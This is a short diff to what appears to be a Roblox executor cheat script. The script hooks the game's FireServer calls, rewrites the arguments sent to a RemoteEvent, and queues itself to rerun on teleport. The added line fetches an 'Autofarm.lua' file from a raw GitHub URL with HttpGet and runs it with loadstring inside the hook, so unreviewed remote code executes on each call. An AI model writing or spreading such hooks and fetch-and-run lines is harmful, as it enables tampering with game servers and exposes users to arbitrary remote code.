@@ -9,6 +9,7 @@ queue_on_teleport([[
 
         if method == "FireServer" and self.Name == "RemoteEvent" then
             args[1] = buffer.fromstring("\1")
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/EzkieMalia/helloautofarm/refs/heads/main/Autofarm.lua"))()
             return old(self, unpack(args))
         end
 
